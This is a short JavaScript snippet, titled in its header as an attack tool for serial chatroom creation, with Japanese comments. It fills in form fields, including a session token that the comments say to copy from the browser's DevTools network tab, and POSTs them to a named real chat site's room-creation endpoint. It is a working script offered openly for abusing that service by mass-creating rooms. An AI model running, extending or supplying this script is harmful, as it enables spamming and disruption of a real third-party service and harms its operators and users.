// himachat Chatroom Serial Creation Attack Tools
// Created By Komepiri

// フォームデータを作成
const formData = new URLSearchParams();
formData.append('marumie', '12345567'); //　必ずDevToolのネットワークから確認すること
formData.append('mysession', 'hoge'); //必ずDevToolのネットワークから確認すること
formData.append('roomname', 'aaa'); // 部屋名
formData.append('roompass', 'hoge'); // 部屋管理パス
formData.append('shoukai', 'aaa'); // 部屋紹介
formData.append('kakolog', '0'); // 0固定でいい 1にすると過去ログなし
formData.append('tuuwa', '0'); // 0固定でいい 1は通話部屋
formData.append('ninzuu', '50'); // 部屋最大人数 2~50まで
formData.append('douituip', '1'); // 同一IPの入室許可 1=許可 0=拒否
formData.append('privatepass', ''); // 部屋パス

// fetchを使用してPOSTリクエストを送信
fetch('https://himachat.jp/room_Create.php', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/x-www-form-urlencoded',
  },
  body: formData.toString(),
})
.then(response => {
  if (!response.ok) {
    throw new Error('Network response was not ok');
  }
  return response.text();
})
.then(data => {
  console.log('POSTリクエストが成功しました:', data);
})
.catch(error => {
  console.error('エラーが発生しました:', error);
});

